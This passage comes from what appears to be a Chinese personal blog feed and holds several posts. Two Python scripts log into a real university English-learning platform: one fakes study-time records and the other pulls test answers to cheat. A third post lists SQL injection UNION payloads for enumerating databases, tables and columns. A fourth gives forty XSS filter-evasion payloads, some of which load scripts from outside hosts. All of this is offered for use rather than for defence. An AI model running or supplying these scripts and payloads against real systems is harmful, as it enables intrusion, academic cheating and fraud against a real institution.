class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">root = <span class="string">"http://202.194.7.18/NPlearning"</span></span><br><span class="line">timeurl = root+<span class="string">"/Student/LogTime.aspx"</span></span><br><span class="line">studyurl = root+<span class="string">"/student/CourseStudy.aspx"</span></span><br><span class="line">ctoken = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">ua = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0"</span>&#125;</span><br><span class="line">s.headers.update(ua)</span><br><span class="line">s.get(root)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomnocache</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(random.random())</span><br><span class="line"></span><br><span class="line"><span class="comment">#登陆账号</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    data = <span class="string">"__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=%2FwEPDwULLTE2NTQ5MDE2NTlkZAPwlkpH14E6NeK5kuxpWcxRlhG6&amp;tbName="</span>+username+<span class="string">"&amp;tbPwd="</span>+password+<span class="string">"&amp;btnLogin=%E7%99%BB+%E5%BD%95"</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,en-US;q=0.7,en;q=0.3"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"http://202.194.7.18/NPlearning/login.aspx"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    t = s.post(root+<span class="string">"/login.aspx"</span>, data = data, headers = headers)</span><br><span class="line">    print(<span class="string">"登陆成功"</span>)</span><br><span class="line"></span><br><span class="line">    ctoken = t.text[t.text.find(<span class="string">"InitToken('"</span>) + <span class="number">11</span>:t.text.find(<span class="string">"InitToken('"</span>) + <span class="number">49</span>]</span><br><span class="line">    <span class="comment"># 添加了cookies</span></span><br><span class="line">    c = requests.cookies.RequestsCookieJar()  <span class="comment"># 定义一个cookie对象</span></span><br><span class="line">    c.set(<span class="string">'TimeRecordEnabled'</span>, <span class="string">'true'</span>)  <span class="comment"># 增加cookie的值</span></span><br><span class="line">    s.cookies.update(c)  <span class="comment"># 更新s的cookie</span></span><br><span class="line">    c.set(<span class="string">'ctoken'</span>, ctoken)</span><br><span class="line">    s.cookies.update(c)</span><br><span class="line">    <span class="comment">#访问http://202.194.7.18/NPlearning/studentdefault.aspx，不知道作用是什么，没有返回任何东西，但是添加了cookies，估计是向服务器记录什么</span></span><br><span class="line">    s.get(root+<span class="string">"/studentdefault.aspx"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.学习课程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">couseStudy</span><span class="params">(book,unit)</span>:</span></span><br><span class="line">    data = <span class="string">"t=studyunit&amp;c=2017-0002-0033&amp;m=College_English_NEW_SecEdition_Integrated_3&amp;u=Unit_0"</span>+str(unit)+<span class="string">"&amp;nocache="</span>+randomnocache()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,en-US;q=0.7,en;q=0.3"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"http://202.194.7.18/NPlearning/student/CourseIndex.aspx?c=2017-0002-0033&amp;m=College_English_NEW_SecEdition_Integrated_3"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    s.get(studyurl,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.检查授权</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkauthorize</span><span class="params">()</span>:</span></span><br><span class="line">    data=<span class="string">"logType=checkneedauthorize&amp;material=College_English_NEW_SecEdition_Integrated_3&amp;nocache="</span>+randomnocache()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,en-US;q=0.7,en;q=0.3"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"http://202.194.7.18/NPlearning/student/CourseStudy.aspx?t=studyunit&amp;c=2017-0002-0033&amp;m=College_English_NEW_SecEdition_Integrated_3&amp;u=Unit_02&amp;nocache="</span>+randomnocache(),</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    ok = s.get(timeurl,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.不知道用来干啥用的方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcomment</span><span class="params">(book,unit)</span>:</span></span><br><span class="line">    data = <span class="string">"logType=getcomment&amp;classno=2017-0002-0033&amp;material=College_English_NEW_SecEdition_Integrated_3&amp;unit=Unit_0"</span>+str(unit)+<span class="string">"&amp;nocache="</span>+randomnocache()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,en-US;q=0.7,en;q=0.3"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"http://202.194.7.18/NPlearning/student/CourseStudy.aspx?t=studyunit&amp;c=2017-0002-0033&amp;m=College_English_NEW_SecEdition_Integrated_3&amp;u=Unit_0"</span>+str(unit)+<span class="string">"&amp;nocache="</span>+randomnocache(),</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    s.get(timeurl,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取服务器时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getServerTime</span><span class="params">()</span>:</span></span><br><span class="line">    data = <span class="string">"logType=getservertime&amp;nocache="</span> + randomnocache()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,en-US;q=0.7,en;q=0.3"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"http://202.194.7.18/NPlearning/studentdefault.aspx"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">        <span class="string">"X-Requested-With"</span>: <span class="string">"XMLHttpRequest"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    servertime = s.get(timeurl,data=data,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> servertime.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.开始记录时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">startNewStatTime</span><span class="params">(book,unit)</span>:</span></span><br><span class="line">    data = <span class="string">"logType=startnewstattime&amp;stattype=1&amp;material="</span>+<span class="string">"College_English_NEW_SecEdition_Integrated_3&amp;unit=unit_0"</span>+str(unit)+<span class="string">"&amp;class=2017-0002-0033&amp;nocache="</span>+randomnocache()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,en-US;q=0.7,en;q=0.3"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"http://202.194.7.18/NPlearning/studentdefault.aspx"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 添加了cookies</span></span><br><span class="line">    c = requests.cookies.RequestsCookieJar()  <span class="comment"># 定义一个cookie对象</span></span><br><span class="line">    c.set(<span class="string">'StudyStart'</span>, getServerTime())  <span class="comment"># 增加cookie的值</span></span><br><span class="line">    s.cookies.update(c)  <span class="comment"># 更新s的cookie</span></span><br><span class="line">    c.set(<span class="string">'Material'</span>, <span class="string">'College_English_NEW_SecEdition_Integrated_3'</span>)  <span class="comment"># 增加cookie的值</span></span><br><span class="line">    s.cookies.update(c)  <span class="comment"># 更新s的cookie</span></span><br><span class="line">    c.set(<span class="string">'Unit'</span>, <span class="string">"Unit_0"</span>+str(unit)+<span class="string">"&amp;nocache="</span>+randomnocache())  <span class="comment"># 增加cookie的值</span></span><br><span class="line">    s.cookies.update(c)  <span class="comment"># 更新s的cookie</span></span><br><span class="line">    c.set(<span class="string">'ClassNo'</span>, <span class="string">'2017-0002-0033'</span>)  <span class="comment"># 增加cookie的值</span></span><br><span class="line">    s.cookies.update(c)  <span class="comment"># 更新s的cookie</span></span><br><span class="line">    s.get(timeurl,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.更新记录时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">updateStatTime</span><span class="params">()</span>:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,en-US;q=0.7,en;q=0.3"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"http://202.194.7.18/NPlearning/studentdefault.aspx"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">"logType=updatestattime"</span> + <span class="string">"&amp;nocache="</span> + randomnocache()</span><br><span class="line">    s.get(timeurl,data=data,headers=headers)</span><br><span class="line">    data = <span class="string">"logType=gettoken&amp;nocache="</span>+randomnocache()</span><br><span class="line">    s.get(timeurl,data = data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.结束记录时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">endStatTime</span><span class="params">()</span>:</span></span><br><span class="line">    s.get(timeurl,data=<span class="string">"logType=endstattime"</span> + <span class="string">"&amp;nocache="</span> + randomnocache())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#时间循环1分钟更新一下时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oneMin</span><span class="params">(tim)</span>:</span></span><br><span class="line">    min = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        updateStatTime()</span><br><span class="line">        print(<span class="string">"更新"</span>+str(min)+<span class="string">"分钟"</span>)</span><br><span class="line">        <span class="keyword">if</span> (min&gt;tim):</span><br><span class="line">            print(<span class="string">"结束"</span>)</span><br><span class="line">            endStatTime()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">60</span>)</span><br><span class="line">        min += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">login(<span class="string">"2017********"</span>,<span class="string">"*********"</span>)</span><br><span class="line">couseStudy(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">checkauthorize()</span><br><span class="line">getcomment(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">startNewStatTime(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">oneMin(<span class="number">15</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>查询重要数据的sql语句</title>
      <link href="/2018/sql-to-select-some-base-info.html"/>
      <url>/2018/sql-to-select-some-base-info.html</url>
      
        <content type="html"><![CDATA[<p>查询用户名，数据库名，数据库版本信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">concat_ws</span>(<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="keyword">version</span>())) %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>查询所有数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure><p>查询一个库中所有的表的名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="built_in">char</span>(<span class="number">32</span>),table_name,<span class="built_in">char</span>(<span class="number">32</span>)) <span class="keyword">from</span> information_schema.tables   <span class="keyword">where</span> table_schema=<span class="number">0x7365637572697479</span>  %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>注意。在系统自带的表中查东西，where后面的值应该是单引号包裹或者16进制编码，通常用16进制</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'my_db'</span></span><br></pre></td></tr></table></figure><p>查询一个表中所有列的名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="built_in">char</span>(<span class="number">32</span>),table_name,<span class="built_in">char</span>(<span class="number">32</span>)) <span class="keyword">from</span> information_schema.COLUMNS   <span class="keyword">where</span> table_schema=<span class="number">0x7365637572697479</span>  %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'my_db'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新理念外语网络教学平台获取任意答案</title>
      <link href="/2018/new-concept-foreign-language-online-teaching-platform-to-get-arbitrary-answers.html"/>
      <url>/2018/new-concept-foreign-language-online-teaching-platform-to-get-arbitrary-answers.html</url>
      
        <content type="html"><![CDATA[<p>给大家哦分享一个获取任意答案的脚本。</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">root = <span class="string">"http://202.194.7.18/NPlearning"</span></span><br><span class="line">answerurl=root+<span class="string">"/Student/ViewTestTask.aspx"</span></span><br><span class="line">ctoken = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">ua = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0"</span>&#125;</span><br><span class="line">s.headers.update(ua)</span><br><span class="line">s.get(root)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    data = <span class="string">"__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=%2FwEPDwULLTE2NTQ5MDE2NTlkZAPwlkpH14E6NeK5kuxpWcxRlhG6&amp;tbName="</span>+username+<span class="string">"&amp;tbPwd="</span>+password+<span class="string">"&amp;btnLogin=%E7%99%BB+%E5%BD%95"</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,en-US;q=0.7,en;q=0.3"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"http://202.194.7.18/NPlearning/login.aspx"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    t = s.post(root+<span class="string">"/login.aspx"</span>, data = data, headers = headers)</span><br><span class="line">    print(<span class="string">"登陆成功"</span>)</span><br><span class="line">    ctoken = t.text[t.text.find(<span class="string">"InitToken('"</span>) + <span class="number">11</span>:t.text.find(<span class="string">"InitToken('"</span>) + <span class="number">49</span>]</span><br><span class="line">    c = requests.cookies.RequestsCookieJar()</span><br><span class="line">    c.set(<span class="string">'ctoken'</span>, ctoken)</span><br><span class="line">    s.cookies.update(c)</span><br><span class="line">    s.get(root+<span class="string">"/studentdefault.aspx"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomnocache</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(random.random())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getanswer</span><span class="params">(part,ttid,sheetid,sttid)</span>:</span></span><br><span class="line">    data = <span class="string">"action=getPart&amp;partnum="</span>+str(part)+<span class="string">"&amp;ttid="</span>+str(ttid)+<span class="string">"&amp;sheetid="</span>+str(sheetid)+<span class="string">"&amp;sttid="</span>+str(sttid)+<span class="string">"&amp;nocache="</span>+randomnocache()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,en-US;q=0.7,en;q=0.3"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"http://202.194.7.18/NPlearning/student/ViewTestTask.aspx"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    ans=s.post(url=answerurl,data=data,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> ans.text.find(<span class="string">"服务器错误"</span>)==<span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> ans.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">answer</span><span class="params">(ttid,sheetid,sttid)</span>:</span></span><br><span class="line">    fo = open(<span class="string">"D://EnglishAnswer.html"</span>,<span class="string">"a+"</span>)</span><br><span class="line">    fo.write(getanswer(<span class="number">1</span>, ttid,sheetid,sttid))</span><br><span class="line">    fo.write(getanswer(<span class="number">2</span>, ttid, sheetid, sttid))</span><br><span class="line">    fo.write(getanswer(<span class="number">3</span>, ttid, sheetid, sttid))</span><br><span class="line">    fo.write(getanswer(<span class="number">4</span>, ttid, sheetid, sttid))</span><br><span class="line">    fo.close()</span><br><span class="line"></span><br><span class="line">login(<span class="string">"20170030****"</span>,<span class="string">"8*******"</span>) <span class="comment">#这里输入大家自己的账号密码</span></span><br><span class="line">answer(<span class="number">7707</span>,<span class="number">1634</span>,<span class="number">289502</span>) <span class="comment">#这里需要输入获取到的ttid,sheetid,sttid.这三个参数是开始做题才分配的，需要大家自己找</span></span><br></pre></td></tr></table></figure><p>最终的答案是一个html文件，存在D盘根目录，名称EnglishAnswer.html,直接双击用浏览器打开就可以。</p><p>后续补充：有时候网页中会出现个别字符导致文件写入编码方式出错，请自己使用replace函数移除相应字符。</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss payload</title>
      <link href="/2018/xss-payload.html"/>
      <url>/2018/xss-payload.html</url>
      
        <content type="html"><![CDATA[<p>总结了常用的xss payload</p><a id="more"></a><p>1.普通的XSS JavaScript注入</p><pre><code>&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</code></pre><p>2.IMG标签XSS使用JavaScript命令</p><pre><code>&lt;IMG SRC=1 ONERROR=alert(&apos;XSS&apos;)&gt;</code></pre><p>3.IMG标签无分号无引号</p><pre><code>&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</code></pre><p>4.IMG标签大小写不敏感</p><pre><code>&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</code></pre><p>5.HTML编码(必须有分号)</p><pre><code>&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;</code></pre><p>6.修正缺陷IMG标签</p><pre><code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</code></pre><p>7.formCharCode标签(计算器)</p><pre><code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</code></pre><p>8.UTF-8的Unicode编码(计算器)</p><pre><code>&lt;IMG SRC=jav..省略..S&apos;)&gt;</code></pre><p>9.7位的UTF-8的Unicode编码是没有分号的(计算器)</p><pre><code>&lt;IMG SRC=jav..省略..S&apos;)&gt;</code></pre><p>10.十六进制编码也是没有分号(计算器)</p><pre><code>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</code></pre><p>11.嵌入式标签,将Javascript分开</p><pre><code>&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</code></pre><p>12.嵌入式编码标签,将Javascript分开</p><pre><code>&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</code></pre><p>13.嵌入式换行符</p><pre><code>&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</code></pre><p>14.嵌入式回车</p><pre><code>&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</code></pre><p>15.嵌入式多行注入JavaScript,这是XSS极端的例子</p><pre><code>&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</code></pre><p>16.解决限制字符(要求同页面)</p><pre><code>&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;&lt;script&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos; src=ht&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;tp://ww&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;w.shell&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;.net/1.&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;js&gt;&lt;/sc&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;ript&gt;&quot;)&apos;&lt;/script&gt;&lt;script&gt;eval_r(z)&lt;/script&gt;</code></pre><p>17.空字符</p><pre><code>perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</code></pre><p>18.空字符2,空字符在国内基本没效果.因为没有地方可以利用</p><pre><code>perl -e &apos;print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out</code></pre><p>19.Spaces和meta前的IMG标签</p><pre><code>&lt;IMG SRC=&quot; javascript:alert(&apos;XSS&apos;);&quot;&gt;</code></pre><p>20.Non-alpha-non-digit XSS</p><pre><code>&lt;SCRIPT/XSS SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code></pre><p>21.Non-alpha-non-digit XSS to 2</p><pre><code>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</code></pre><p>22.Non-alpha-non-digit XSS to 3</p><pre><code>&lt;SCRIPT/SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code></pre><p>23.双开括号</p><pre><code>&lt;&lt;SCRIPT&gt;alert(a.sourse);//&lt;&lt;/SCRIPT&gt;</code></pre><p>24.无结束脚本标记(仅火狐等浏览器)</p><pre><code>&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</code></pre><p>25.无结束脚本标记</p><pre><code>&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</code></pre><p>26.半开的HTML/JavaScript XSS</p><pre><code>&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;</code></pre><p>27.双开角括号</p><pre><code>&lt;iframe src=http://3w.org/XSS.html &gt;</code></pre><p>28.无单引号、双引号、分号</p><pre><code>&lt;SCRIPT&gt;a=/XSS/ alert(a.source)&lt;/SCRIPT&gt;</code></pre><p>29.换码过滤的JavaScript</p><pre><code>\&quot;;alert(&apos;XSS&apos;);//</code></pre><p>30.结束Title标签</p><pre><code>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</code></pre><p>31.Input Image</p><pre><code>&lt;INPUT SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code></pre><p>32.BODY Image</p><pre><code>&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</code></pre><p>33.BODY标签</p><pre><code>&lt;BODY(&apos;XSS&apos;)&gt;</code></pre><p>34.IMG Dynsrc</p><pre><code>&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</code></pre><p>35.IMG Lowsrc</p><pre><code>&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</code></pre><p>36.BGSOUND</p><pre><code>&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code></pre><p>37.STYLE sheet</p><pre><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</code></pre><p>38.远程样式表</p><pre><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://3w.org/xss.css&quot;&gt;</code></pre><p>39.List-style-image(列表式)</p><pre><code>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</code></pre><p>40.IMG VBscript</p><pre><code>&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</code></pre>]]></content>
      
      
      <categories>
